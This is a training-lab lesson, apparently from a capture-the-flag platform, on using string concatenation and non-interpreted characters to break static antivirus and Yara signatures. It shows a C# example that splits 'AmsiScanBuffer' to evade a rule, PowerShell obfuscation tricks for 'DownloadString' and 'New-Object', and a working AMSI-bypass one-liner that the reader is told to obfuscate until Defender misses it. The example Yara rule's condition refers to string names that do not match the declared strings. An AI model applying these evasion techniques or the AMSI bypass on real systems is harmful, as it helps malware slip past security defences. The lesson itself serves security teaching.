# Object Concatenation

Concatenation is a common programming concept that combines two separate objects into one, such as a string.

A pre-defined operator defines where the concatenation will occur to combine two independent objects. Below is a generic example of string concatenation in Python:

```python
A = "Hello "
B = "THM"
C = A + B
print(C)
# Output: Hello THM
```

Depending on the language used in a program, there may be different or multiple pre-defined operators for concatenation. Below is a table of common languages and their corresponding pre-defined operators:

| Language   | Concatenation Operator                        |
|------------|----------------------------------------------|
| Python     | `+`                                          |
| PowerShell | `+`, `,`, `$`, or no operator at all          |
| C#         | `+`, `String.Join`, `String.Concat`           |
| C          | `strcat`                                     |
| C++        | `+`, `append`                                |

The aforementioned white paper, *Layered Obfuscation Taxonomy*, summarizes these practices well under the code-element layer’s data splitting/merging sub-layer.

---

## Implications for Attackers

What does this mean for attackers? Concatenation can open the doors to several vectors to modify signatures or manipulate other aspects of an application. The most common example of concatenation being used in malware is breaking targeted static signatures, as covered in the Signature Evasion room. Attackers can also use it preemptively to break up all objects of a program and attempt to remove all signatures at once without hunting them down, commonly seen in obfuscators as covered in task 9.

Below we will observe a static Yara rule and attempt to use concatenation to evade the static signature.

```yara
rule ExampleRule
{
    strings:
        $text_string = "AmsiScanBuffer"
        $hex_string = { B8 57 00 07 80 C3 }

    condition:
        $my_text_string or $my_hex_string
}
```

When a compiled binary is scanned with Yara, it will create a positive alert/detection if the defined string is present. Using concatenation, the string can be functionally the same but will appear as two independent strings when scanned, resulting in no alerts.

**Example:**

```csharp
// Detected by Yara
IntPtr ASBPtr = GetProcAddress(TargetDLL, "AmsiScanBuffer");

// Not detected by Yara
IntPtr ASBPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer");
```

If the second code block were to be scanned with the Yara rule, there would be no alerts!

---

## Using Non-Interpreted Characters

Extending from concatenation, attackers can also use non-interpreted characters to disrupt or confuse a static signature. These can be used independently or with concatenation, depending on the strength/implementation of the signature. Below is a table of some common non-interpreted characters that can be leveraged:

| Character      | Purpose                                         | Example                        |
|----------------|-------------------------------------------------|--------------------------------|
| Breaks         | Break a single string into multiple substrings  | `('co'+'ffe'+'e')`             |
| Reorders       | Reorder a string’s components                   | `('{1}{0}'-f'ffee','co')`      |
| Whitespace     | Include whitespace that is not interpreted      | `.( 'Ne' +'w-Ob' + 'ject')`    |
| Ticks          | Include ticks that are not interpreted          | ``d`own`LoAd`Stri`ng``         |
| Random Case    | Tokens are generally not case sensitive         | `dOwnLoAdsTRing`               |

---

## Challenge: Obfuscate a PowerShell Snippet

Using the knowledge you have accrued throughout this task, obfuscate the following PowerShell snippet until it evades Defender’s detections:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

To get you started, we recommend breaking up each section of the code and observing how it interacts or is detected. You can then break the signature present in the independent section and add another section to it until you have a clean snippet.

Once you think your snippet is sufficiently obfuscated, submit it to the webserver at `http://MACHINE_IP`; if successful, a flag will appear in a pop-up.

If you are still stuck, we have provided a walkthrough of the solution below.